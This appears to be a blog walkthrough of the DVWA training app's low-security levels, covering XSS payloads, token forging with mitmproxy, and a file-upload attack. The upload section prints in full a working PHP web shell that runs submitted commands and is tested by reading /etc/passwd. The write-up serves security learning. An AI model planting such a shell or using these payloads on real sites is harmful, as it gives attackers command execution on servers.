---
title: "DVWA Walkthrough"
date: 2023-03-11T08:15:23+09:00
draft: false
tags: [dvwa,proxy]
---

# DVWA Walkthrough (Low level)

### Low: XSS (DOM)
- Vulnerablility URL: http://127.0.0.1:42001/vulnerabilities/xss_d/
- How to test: https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting.html

- Observation 1
1. Pick any language from the dropdown list, then press the Select button.
2. If the selected language is "English" then, the address will be changed to  http://127.0.0.1:42001/vulnerabilities/xss_d/?default=English
3. Modify the address to http://127.0.0.1:42001/vulnerabilities/xss_d/?default=Assyrian , then Assyrian will be appeared in the dropdown list.

- page source
```
<div class="vulnerable_code_area">
 		<p>Please choose a language:</p>
		<form name="XSS" method="GET">
			<select name="default">
				<script>
					if (document.location.href.indexOf("default=") >= 0) {
						var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
						document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
						document.write("<option value='' disabled='disabled'>----</option>");
					}

					document.write("<option value='English'>English</option>");
					document.write("<option value='French'>French</option>");
					document.write("<option value='Spanish'>Spanish</option>");
					document.write("<option value='German'>German</option>");
				</script>
			</select>
			<input type="submit" value="Select" />
		</form>
	</div>
```
    - The problem is at `var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);`, where what's going to be displayed is programmatically obtained from 8 bytes after where "default=" is, that is user-input. 
    - Thus, user can control what's going to be displayed, giving a URI string
- how to break
    - add `<script> blah blah </script>` at the end of the URI
    - Example(pops up a simple hello message): 
    `http://127.0.0.1:42001/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(%27hello%27)%3C/script%3E`

===========
### Low: XSS (Reflected)
- Observation 1
1. A string can be entered in to the textbox
2. When the submit button is pressed, the entered string is displayed 

- page source
    ```
    <div class="vulnerable_code_area">
		<form name="XSS" action="#" method="GET">
			<p>
				What's your name?
				<input type="text" name="name">
				<input type="submit" value="Submit">
			</p>

		</form>
		
	</div>
    ``````
- how to break
    - add `<script>alert('world')</script>` into the textbox
    - URL at this time, `http://127.0.0.1:42001/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27world%27%29%3C%2Fscript%3E#`

===========
### Low: XSS (Stored)
- Observation
1. There are two text boxes; one for Name, one for Message
2. Entered Name and Message appear accumulated below the text boxes.

- how to break
    - add `<script>alert('world')</script>` into the messages textbox
    - Since the message is stored and viewed, it pops up a windows everytime the menu is accessed.


===========
### Low: JavaScript

- Observation
1. There's a textbox with a default input text "ChangeMe" 
2. Source code
    - Looking at the source code, a hidden parameter, token is calculated based on the passed "phrase"
    ```
    <form name="low_js" method="post">
        <input type="hidden" name="token" value="" id="token" />
        <label for="phrase">Phrase</label> <input type="text" name="phrase" value="ChangeMe" id="phrase" />
        <input type="submit" id="send" name="send" value="Submit" />
    </form><script>

    /*
    MD5 code from here
    https://github.com/blueimp/JavaScript-MD5
    */

    !function(n){"use strict";function t(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function r(n,t){return n<<t|n>>>32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&r|~t&o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&o|r&~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r>>5]|=128<<r%32,n[14+(r+64>>>9<<4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e<n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r="",e=32*n.length;for(t=0;t<e;t+=8)r+=String.fromCharCode(n[t>>5]>>>t%32&255);return r}function d(n){var t,r=[];for(r[(n.length>>2)-1]=void 0,t=0;t<r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t<e;t+=8)r[t>>5]|=(255&n.charCodeAt(t/8))<<t%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length>16&&(o=i(o,8*n.length)),r=0;r<16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e="";for(r=0;r<n.length;r+=1)t=n.charCodeAt(r),e+="0123456789abcdef".charAt(t>>>4&15)+"0123456789abcdef".charAt(15&t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)}"function"==typeof define&&define.amd?define(function(){return A}):"object"==typeof module&&module.exports?module.exports=A:n.md5=A}(this);

        function rot13(inp) {
            return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);});
        }

        function generate_token() {
            var phrase = document.getElementById("phrase").value;
            document.getElementById("token").value = md5(rot13(phrase));
        }

        generate_token();
    </script>	</div>
    ```
- Observation 2
    - captured packet when "ChangeMe" is passed:
    ![token-ChangeMe](captured-ChangeMe.png)
    - the accompanied token should be calculated by: md5(rot13("ChangeMe"))
    - check if that's true (with CyberChef); look at the value of the token
    ![cyberchef](dvwa-cyberchef.png)

- Solution, 
    - pass the new string, "sucess" with a token calculated by `md5(rot13("success"))`
    - that is 38581812b435834ebf84ebcc2c6424d6
    - How to pass it?
        - run mitmproxy
        - intercept packets by `set intercept '~u /dvwa & ~q'`
        - press the 'Submit' button from the DVWA page
        - modify the request by pressing `e` and 
            - `a` : request-body
            - edit the body to be `token=38581812b435834ebf84ebcc2c6424d6&phrase=success&send=Submit`
        - resume by `a`


===========
### Low: File Upload


- Observation 1
  - there is a button to choose a file to upload
  ```
  <div class="vulnerable_code_area">
		<form enctype="multipart/form-data" action="#" method="POST">
			<input type="hidden" name="MAX_FILE_SIZE" value="100000" />
			Choose an image to upload:<br /><br />
			<input name="uploaded" type="file" /><br />
			<br />
			<input type="submit" name="Upload" value="Upload" />

		</form>	
</div>
  ```
  - when a file is uploaded, a message like "../../hackable/uploads/XXXX successfully uploaded" is displayed.

- Solution1(very simple one)
    - code the following php file (attack.php), and upload it.
    ```
    ```
    - access "http://dvwa:42001/vulnerabilities/upload/../../hackable/uploads/attack.php"

- Solution2(a more realistic one)
    - code (from https://github.com/artyuum/simple-php-web-shell/blob/master/index.php )
    ```
    <?php
    if (!empty($_POST['cmd'])) {
        $cmd = shell_exec($_POST['cmd']);
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Web Shell</title>
        <style>
            * {
                -webkit-box-sizing: border-box;
                box-sizing: border-box;
            }

            body {
                font-family: sans-serif;
                color: rgba(0, 0, 0, .75);
            }

            main {
                margin: auto;
                max-width: 850px;
            }

            pre,
            input,
            button {
                padding: 10px;
                border-radius: 5px;
                background-color: #efefef;
            }

            label {
                display: block;
            }

            input {
                width: 100%;
                background-color: #efefef;
                border: 2px solid transparent;
            }

            input:focus {
                outline: none;
                background: transparent;
                border: 2px solid #e6e6e6;
            }

            button {
                border: none;
                cursor: pointer;
                margin-left: 5px;
            }

            button:hover {
                background-color: #e6e6e6;
            }

            .form-group {
                display: -webkit-box;
                display: -ms-flexbox;
                display: flex;
                padding: 15px 0;
            }
        </style>

    </head>

    <body>
        <main>
            <h1>Web Shell</h1>
            <h2>Execute a command</h2>

            <form method="post">
                <label for="cmd"><strong>Command</strong></label>
                <div class="form-group">
                    <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
                        onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
                    <button type="submit">Execute</button>
                </div>
            </form>

            <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
                <h2>Output</h2>
                <?php if (isset($cmd)): ?>
                    <pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
                <?php else: ?>
                    <pre><small>No result.</small></pre>
                <?php endif; ?>
            <?php endif; ?>
        </main>
    </body>
    </html>
    ```
    - upload it, and access to `http://dvwa:42001/vulnerabilities/upload/../../hackable/uploads/index.php` (`http://dvwa:42001/hackable/uploads/index.php`)
    - when the webshell page is loaded, test with "echo /etc/passwd"

